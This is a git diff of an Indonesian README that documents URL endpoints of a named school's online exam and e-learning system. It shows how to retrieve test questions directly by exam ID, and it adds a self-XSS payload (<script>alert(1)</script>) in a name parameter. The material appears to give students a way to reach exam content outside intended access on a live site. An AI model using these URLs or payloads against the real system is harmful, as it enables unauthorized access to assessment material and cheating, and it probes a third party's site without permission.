@@ -170,7 +170,7 @@ Semua ini bisa berubah karena ini hanya dokumentasi selama saya sekolah
 >> - ``4 = Untuk Soal PG``
 
 ## Tipe Soal + ID Mapel
-`Bisa berubah tidak sama karena pasti berbeda jadi jangan jadi patokan`
+`Bisa berubah tidak sama karena pasti berbeda jadi jangan jadi patokan`\
 Mapel             = Tipe Soal + ID mapel
 
 
@@ -215,3 +215,13 @@ Geografi          = 0 + geo12vero
 `sman1kaliwungu.sch.id/smanka/previewsoal.php?kirim=eko12pas1riskah&nomer=1&jml=50&sp=&batas=50`
 
 ---
+# E-Learning
+##### E-Learning pada tahun 2019-2021
+Semua ini bisa berubah karena ini hanya dokumentasi selama saya sekolah
+
+### Ambil Soal Ulangan
+   `sman1kaliwungu.sch.id/elearning/ujian/muncul.php?kirim=(id ulangan)&nama=(terserah)`
+   `sman1kaliwungu.sch.id/elearning/ujian/buat.php?no=(nomer soal)&id=(id ulangan)`
+   - Bug Self XSS
+     `sman1kaliwungu.sch.id/elearning/ujian/muncul.php?kirim=(id_ulangan)&nama=<script>alert(1)</script>`
+   
